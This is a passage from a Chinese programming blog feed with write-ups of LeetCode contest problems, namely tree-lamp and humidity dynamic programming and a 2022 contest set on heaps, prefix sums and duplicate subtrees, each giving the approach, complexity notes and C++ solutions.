<li><code>1 &lt;= 节点个数 &lt;= 10^5</code></li>
<li><code>0 &lt;= Node.val &lt;= 1</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/season/2022-fall/problems/U7WvvU/">https://leetcode.cn/contest/season/2022-fall/problems/U7WvvU/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p>动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>最设以 $root$ 为根节点的子树可以变为以下四种形态:</li>
</ol>
<ul>
<li><p>第一种形态：所有的节点均为 $0$；</p>
</li>
<li><p>第二种形态：所有的节点均为 $1$；</p>
</li>
<li><p>第三种形态：$root$为 $0$，其余节点均为 $1$；</p>
</li>
<li><p>第四种形态：$root$为 $1$，其余节点均为 $0$；<br>我们分别设将子树变为以上四种状态所需要的最小操作次数分别为 $a_{00},a_{01},a_{10},a_{11}$，假设 $root$ 的左子树与右子树分别变换为以上四种形态的最小步骤分别为:<br>$$<br>(l_{00},l_{01},l_{10},l_{11}),(r_{00},r_{01},r_{10},r_{11})<br>$$<br>我们知道以上四种形态的变换方式如下:</p>
</li>
<li><p>装换为第一种形态：所有的节点均为 $0$。</p>
<ul>
<li>将两个孩子节点的子树分别变为所有节点均为 $0$，然后使用开关 $1$将 $root$ 变为 $0$；</li>
<li>将两个孩子节点的子树分别变为所有节点均为 $1$，然后使用开关 $1$ 将 $root$ 变为 $1$，然后再使用开关 $3$ 将整颗子树反转；</li>
<li>将两个孩子节点的子树分别变为第三种形态，即根节点为 $0$，其余节点为 $1$，然后利用开关 $1$ 将 $root$ 变为 $0$，然后在利用开关 $2$ 将 $root$ 与孩子节点反装，然后再利用开关 $3$ 将整颗子树反转；</li>
<li>将两个孩子节点的子树分别变为第四种形态，即根节点为 $1$，其余节点为 $0$，然后利用开关 $1$ 将 $root$ 变为 $1$，然后在利用开关 $2$ 将 $root$ 与孩子节点反装；</li>
</ul>
</li>
<li><p>装换为第二种形态：所有的节点均为 $1$。</p>
<ul>
<li>将两个孩子节点的子树分别变为所有节点均为 $1$，然后使用开关 $1$将 $root$ 变为 $1$；</li>
<li>将两个孩子节点的子树分别变为所有节点均为 $0$，然后使用开关 $1$ 将 $root$ 变为 $0$，然后再使用开关 $3$ 将整颗子树反转；</li>
<li>将两个孩子节点的子树分别变为第三种形态，即根节点为 $0$，其余节点为 $1$，然后利用开关 $1$ 将 $root$ 变为 $0$，然后在利用开关 $2$ 将 $root$ 与孩子节点反装；</li>
<li>将两个孩子节点的子树分别变为第四种形态，即根节点为 $1$，其余节点为 $0$，然后利用开关 $1$ 将 $root$ 变为 $1$，然后在利用开关 $2$ 将 $root$ 与孩子节点反装，然后利用开关 $3$ 将整颗子树反转；</li>
</ul>
</li>
<li><p>装换为第三种形态：$root$为 $0$，其余节点均为 $1$。</p>
<ul>
<li>将两个孩子节点的子树分别变为所有节点均为 $1$，然后使用开关 $1$将 $root$ 变为 $0$；</li>
<li>将两个孩子节点的子树分别变为所有节点均为 $0$，然后使用开关 $1$ 将 $root$ 变为 $1$，然后再使用开关 $3$ 将整颗子树反转；</li>
<li>将两个孩子节点的子树分别变为第三种形态，即根节点为 $0$，其余节点为 $1$，然后利用开关 $1$ 将 $root$ 变为 $1$，然后在利用开关 $2$ 将 $root$ 与孩子节点反装；</li>
<li>将两个孩子节点的子树分别变为第四种形态，即根节点为 $1$，其余节点为 $0$，然后利用开关 $1$ 将 $root$ 变为 $0$，然后在利用开关 $2$ 将 $root$ 与孩子节点反装，然后利用开关 $3$ 将整颗子树反转；</li>
</ul>
</li>
<li><p>装换为第四种形态：$root$为 $1$，其余节点均为 $0$。</p>
<ul>
<li>将两个孩子节点的子树分别变为所有节点均为 $0$，然后使用开关 $1$将 $root$ 变为 $1$；</li>
<li>将两个孩子节点的子树分别变为所有节点均为 $1$，然后使用开关 $1$ 将 $root$ 变为 $0$，然后再使用开关 $3$ 将整颗子树反转；</li>
<li>将两个孩子节点的子树分别变为第三种形态，即根节点为 $0$，其余节点为 $1$，然后利用开关 $1$ 将 $root$ 变为 $1$，然后在利用开关 $2$ 将 $root$ 与孩子节点反装，然后利用开关 $3$ 将整颗子树反转；</li>
<li>将两个孩子节点的子树分别变为第四种形态，即根节点为 $1$，其余节点为 $0$，然后利用开关 $1$ 将 $root$ 变为 $0$，然后在利用开关 $2$ 将 $root$ 与孩子节点反装；</li>
</ul>
</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示节点的数目。</li>
<li>空间复杂度：$O(C)$，其中 $n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">tuple&lt;<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>&gt; <span class="title">dfs</span><span class="params">(TreeNode * root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        &#125;    </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">auto</span> [l00, l01, l10, l11] = <span class="built_in">dfs</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">auto</span> [r00, r01, r10, r11] = <span class="built_in">dfs</span>(root-&gt;right);</span><br><span class="line">        <span class="type">int</span> a00 = INT_MAX;</span><br><span class="line">        <span class="type">int</span> a01 = INT_MAX;</span><br><span class="line">        <span class="type">int</span> a10 = INT_MAX;</span><br><span class="line">        <span class="type">int</span> a11 = INT_MAX;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* all zero */</span></span><br><span class="line">        a00 = <span class="built_in">min</span>(a00, l00 + r00 + (root-&gt;val != <span class="number">0</span>));</span><br><span class="line">        a00 = <span class="built_in">min</span>(a00, l11 + r11 + (root-&gt;val != <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">        a00 = <span class="built_in">min</span>(a00, l10 + r10 + (root-&gt;val != <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">        a00 = <span class="built_in">min</span>(a00, l01 + r01 + (root-&gt;val != <span class="number">0</span>) + <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* all one */</span></span><br><span class="line">        a11 = <span class="built_in">min</span>(a11, l00 + r00 + (root-&gt;val != <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        a11 = <span class="built_in">min</span>(a11, l11 + r11 + (root-&gt;val != <span class="number">1</span>));</span><br><span class="line">        a11 = <span class="built_in">min</span>(a11, l01 + r01 + (root-&gt;val != <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        a11 = <span class="built_in">min</span>(a11, l10 + r10 + (root-&gt;val != <span class="number">1</span>) + <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* one - zero */</span></span><br><span class="line">        a10 = <span class="built_in">min</span>(a10, l00 + r00 + (root-&gt;val != <span class="number">1</span>));</span><br><span class="line">        a10 = <span class="built_in">min</span>(a10, l11 + r11 + (root-&gt;val != <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        a10 = <span class="built_in">min</span>(a10, l10 + r10 + (root-&gt;val != <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        a10 = <span class="built_in">min</span>(a10, l01 + r01 + (root-&gt;val != <span class="number">1</span>) + <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* zero - one */</span></span><br><span class="line">        a01 = <span class="built_in">min</span>(a01, l11 + r11 + (root-&gt;val != <span class="number">0</span>));</span><br><span class="line">        a01 = <span class="built_in">min</span>(a01, l00 + r00 + (root-&gt;val != <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">        a01 = <span class="built_in">min</span>(a01, l01 + r01 + (root-&gt;val != <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">        a01 = <span class="built_in">min</span>(a01, l10 + r10 + (root-&gt;val != <span class="number">0</span>) + <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> &#123;a00, a01, a10, a11&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">closeLampInTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> [a00, a01, a10, a11] = <span class="built_in">dfs</span>(root);</span><br><span class="line">        <span class="keyword">return</span> a00;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="LCP-65-舒适的湿度"><a href="#LCP-65-舒适的湿度" class="headerlink" title="LCP 65. 舒适的湿度"></a>LCP 65. 舒适的湿度</h3><h4 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h4><p>力扣嘉年华为了确保更舒适的游览环境条件，在会场的各处设置了湿度调节装置，这些调节装置受控于总控室中的一台控制器。 控制器中已经预设了一些调节指令，整数数组<code>operate[i]</code> 表示第 <code>i</code> 条指令增加空气湿度的大小。现在你可以将任意数量的指令修改为降低湿度（变化的数值不变），以确保湿度尽可能的适宜：</p>
<ul>
<li>控制器会选择 一段连续的指令 ，从而进行湿度调节的操作；</li>
<li>这段指令最终对湿度影响的绝对值，即为当前操作的「不适宜度」</li>
<li>在控制器所有可能的操作中，最大 的「不适宜度」即为「整体不适宜度」<br>请返回在所有修改指令的方案中，可以得到的 最小 「整体不适宜度」。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：operate = [5,3,7]</span><br><span class="line"></span><br><span class="line">输出：8</span><br><span class="line"></span><br><span class="line">解释：对于方案 2 的 [5,3,-7] 操作指令 [5],[3],[-7] 的「不适宜度」分别为 5,3,7 操作指令 [5,3],[3,-7] 的「不适宜度」分别为 8,4 操作指令 [5,3,-7] 的「不适宜度」为 1， 因此对于方案 [5,3,-7]的「整体不适宜度」为 8，其余方案的「整体不适宜度」均不小于 8，如下表所示：image.png</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：operate = [20,10]</span><br><span class="line"></span><br><span class="line">输出：20</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= operate.length &lt;= 1000</code></li>
<li><code>1 &lt;= operate[i] &lt;= 1000</code></li>
</ul>
<h4 id="地址-4"><a href="#地址-4" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/3aqs1c/">https://leetcode.cn/problems/3aqs1c/</a></p>
<h4 id="题意-4"><a href="#题意-4" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p>动态规划</p>
</blockquote>
<h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉确实是个不错的题目，详细的题解可以参考「<a href="https://leetcode.cn/problems/3aqs1c/solutions/1846241/chu-ti-ren-lai-xie-zui-liao-by-hqztrue-ft1j/">题解</a>」，确实可以再推导一遍。确实其中的状态转移确实难了一点。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(nU)$，其中 $n$ 表示数组的长度, $U$ 表示数组中的最大元素。</li>
<li>空间复杂度：$O(U)$，其中 $n$ 表示数组的长度，$U$ 表示数组中的最大元素。</li>
</ul>
<h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">unSuitability</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; operate)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = operate.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> u = *<span class="built_in">max_element</span>(operate.<span class="built_in">begin</span>(), operate.<span class="built_in">end</span>());</span><br><span class="line">        u = u * <span class="number">2</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">pre</span><span class="params">(u + <span class="number">1</span>, INT_MAX)</span></span>;</span><br><span class="line">        pre[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : operate) &#123;</span><br><span class="line">            <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(u + <span class="number">1</span>, INT_MAX)</span></span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= u; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (pre[i] == INT_MAX) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i + x &lt;= u) &#123;</span><br><span class="line">                    dp[i + x] = <span class="built_in">min</span>(dp[i + x], <span class="built_in">max</span>(pre[i], i + x));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i - x &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[i - x] = <span class="built_in">min</span>(dp[i - x], pre[i]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[<span class="number">0</span>] = <span class="built_in">min</span>(dp[<span class="number">0</span>], pre[i] - i + x);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            pre = <span class="built_in">move</span>(dp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">min_element</span>(pre.<span class="built_in">begin</span>(), pre.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>天堂硅谷·数字经济算法编程大赛</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/39/</url>
    <content><![CDATA[<h2 id="天堂硅谷·数字经济算法编程大赛"><a href="#天堂硅谷·数字经济算法编程大赛" class="headerlink" title="天堂硅谷·数字经济算法编程大赛"></a>天堂硅谷·数字经济算法编程大赛</h2><p>题目质量还算可以，依旧三题的节奏</p>
<h4 id="题目-01-化学反应"><a href="#题目-01-化学反应" class="headerlink" title="题目-01. 化学反应"></a>题目-01. 化学反应</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>实验室内有一些化学反应物，其中的任意两种反应物之间都能发生反应，且质量的消耗量为 <code>1:1</code></p>
<p>已知初始 <code>material[i]</code> 表示第 <code>i</code> 种反应物的质量，每次进行实验时，会选出当前 质量最大 的两种反应物进行反应，假设反应物的重量分别为 <code>i</code> 和 <code>j</code> ，且 <code>i &lt;= j</code>。反应的结果如下：</p>
<ul>
<li>如果 <code>i == j</code>，那么两种化学反应物都将被消耗完；</li>
<li>如果 <code>i &lt; j</code>，那么质量为 <code>i</code> 的反应物将会完全消耗，而质量为 <code>j</code> 的反应物质量变为 <code>j - i</code> 。<br>最后，最多只会剩下一种反应物，返回此反应物的质量。如果没有反应物剩下，返回 <code>0</code>。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[10,2,6,1]</span><br><span class="line">输出：1</span><br><span class="line">解释：</span><br><span class="line">先选出 10 和 6，得到 4，数组转换为 [4,2,1]，</span><br><span class="line">再选出 4 和 2，得到 2，数组转换为 [2,1]，</span><br><span class="line">最后选出 2 和 1，得到 1，最终数组转换为 [1]，这就是最后剩下反应物的质量。</span><br></pre></td></tr></table></figure>

<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[6,4,10]</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">先选出 10 和 6，得到 4，所以数组转换为 [4,4]，</span><br><span class="line">再选出 4 和 4，得到 0，所以数组转换为 []</span><br><span class="line">因为没有反应物剩下，返回 0。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= material.length &lt;= 30</code></li>
<li><code>1 &lt;= material[i] &lt;= 1000</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/6CE719/">https://leetcode.cn/problems/6CE719/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>堆
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的堆运算，每次选取序列中质量最大的两个元素，然后将其相减的结果加入到堆中，重复上述操作直到堆中的元素为 $0$ 个或者 $1$ 个则结束。需要注意的是当取出的两个元素相等时，则不会再往堆中放回元素。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lastMaterial</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; material)</span> </span>&#123;</span><br><span class="line">        priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, less&lt;<span class="type">int</span>&gt;&gt; pq;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : material) &#123;</span><br><span class="line">            pq.<span class="built_in">emplace</span>(v);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (pq.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> x = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="type">int</span> y = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (x &gt; y) &#123;</span><br><span class="line">                pq.<span class="built_in">emplace</span>(x - y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pq.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pq.<span class="built_in">top</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="题目-02-销售出色区间"><a href="#题目-02-销售出色区间" class="headerlink" title="题目-02. 销售出色区间"></a>题目-02. 销售出色区间</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一份销售数量表 <code>sales</code>，上面记录着某一位销售员每天成功推销的产品数目。</p>
<p>我们认为当销售员同一天推销的产品数目大于 <code>8</code> 个的时候，那么这一天就是「成功销售的一天」。</p>
<p>所谓「销售出色区间」，意味在这段时间内，「成功销售的天数」是严格 大于「未成功销售的天数」。</p>
<p>请你返回「销售出色区间」的最大长度。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：sales = [10,2,1,4,3,9,6,9,9]</span><br><span class="line">输出：5</span><br><span class="line">解释：最大销售出色区间是 [3,9,6,9,9]。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：sales = [5,6,7]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= sales.length &lt;= 104</code></li>
<li><code>0 &lt;= sales[i] &lt;= 16</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/hhrc2022/problems/0Wx4Pc/">https://leetcode.cn/contest/hhrc2022/problems/0Wx4Pc/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>前缀和 + 贪心法则
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们当前元素如果 $\textit{sales}[i] &gt; 8$ 则记为 $1$，否则记为 $-1$，并用数组 $\textit{arr}$ 进行记录，然后我们统计 $arr$ 的前缀和，此时我们知道：</li>
</ol>
<ul>
<li>如果 $sum[i] &gt; 0$ 则表示数组前 $i$ 项中正数的数目大于负数的数目，则该区间为销售出色区间。则此时以 $i$ 为终点的最大销售出色区间长度为 $i$。</li>
<li>如果 $sum[i] \le 0$ 则表示数组前 $i$ 项中正数的数目小于等于负数的数目，则该区间不为销售出色区间。此时我们知道以 $i$ 为终点的最大区间则为 $sum[i] - cnt[sum[i] - 1]$</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，其中 $n$ 表示节点的数目。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 表示节点的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestESR</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; sales)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = sales.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="type">int</span> prevSum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            prevSum += (sales[i] &gt; <span class="number">8</span> ? <span class="number">1</span> : <span class="number">-1</span>); </span><br><span class="line">            <span class="keyword">if</span> (prevSum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res, i + <span class="number">1</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (cnt.<span class="built_in">count</span>(prevSum - <span class="number">1</span>)) &#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res, i - cnt[prevSum - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!cnt.<span class="built_in">count</span>(prevSum)) &#123;</span><br><span class="line">                cnt[prevSum] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="题目-03-重复的彩灯树"><a href="#题目-03-重复的彩灯树" class="headerlink" title="题目-03. 重复的彩灯树"></a>题目-03. 重复的彩灯树</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>有一棵结构为二叉树的圣诞树 <code>root</code> 挂满了彩灯，各节点值表示彩灯的颜色。</p>
<p>如果两棵子树具有 相同的结构 和 相同的彩灯颜色分布，则它们是 重复 的。</p>
<p>请返回这棵树上所有 重复的子树。</p>
<p>注意：</p>
<p>对于同一类的重复子树，你只需要返回其中任意一棵的根结点即可。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,3,3,null,2,null,2]</span><br><span class="line">输出：[[3,null,2],[2]]</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [3,3,2,null,2]</span><br><span class="line">输出：[[2]]</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [1,3,3,null,2,2]</span><br><span class="line">输出：[[2]]</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li>树中的结点数在 <code>[1,6000]</code> 范围内。</li>
<li><code>-200 &lt;= Node.val &lt;= 200</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/EXvqDp/">https://leetcode.cn/problems/EXvqDp/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>模拟
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们直接将子树转换为字符串即可，具体子树转换为字符串的方式有许多中，可以参考力扣上的关于二叉树转换为字符串的题目，所以非常简单的题目了。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n^2)$，$n$ 为节点的数目。</li>
<li>空间复杂度：时间复杂度为 $O(n^2)$，$n$ 为节点的数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">dfs</span><span class="params">(TreeNode* root, unordered_map&lt;string, vector&lt;TreeNode *&gt;&gt; &amp;cnt)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        string left = <span class="built_in">dfs</span>(root-&gt;left, cnt);</span><br><span class="line">        string right = <span class="built_in">dfs</span>(root-&gt;right, cnt);</span><br><span class="line">        string str =  <span class="string">&quot;(&quot;</span> + left + <span class="string">&quot;)&quot;</span> + <span class="built_in">to_string</span>(root-&gt;val) + <span class="string">&quot;(&quot;</span> + right + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        cnt[str].<span class="built_in">emplace_back</span>(root);</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">vector&lt;TreeNode*&gt; <span class="title">lightDistribution</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;string, vector&lt;TreeNode *&gt;&gt; cnt;</span><br><span class="line">        <span class="built_in">dfs</span>(root, cnt);</span><br><span class="line">        vector&lt;TreeNode *&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [_, vec] : cnt) &#123;</span><br><span class="line">            <span class="keyword">if</span> (vec.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                res.<span class="built_in">emplace_back</span>(vec[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="题目-04-补给覆盖"><a href="#题目-04-补给覆盖" class="headerlink" title="题目-04. 补给覆盖"></a>题目-04. 补给覆盖</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>已知有一片呈二叉树的道路，我们要在道路上的一些节点设置补给站支援。</p>
<p>补给站可以设置在任意节点上，每个补给站可以使距离自身小于等于 <code>1</code> 个单位的节点获得补给。</p>
<p>若要使道路的所有节点均能获得补给，请返回所需设置的补给站最少数量。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[0,0,0]</span><br><span class="line">输出：1</span><br><span class="line">解释：如图所示，一个补给站足够使道路的所有节点获得补给。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[0,0,0,null,null,null,0]</span><br><span class="line">输出：2</span><br><span class="line">解释：需要至少设置两个补给站来使道路的所有节点获得补给。 上图显示了补给站设置的有效位置之一。</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li>节点的数量范围为 <code>[1, 1000]</code>。</li>
<li>每个节点的值均为 <code>0</code> 。</li>
</ul>
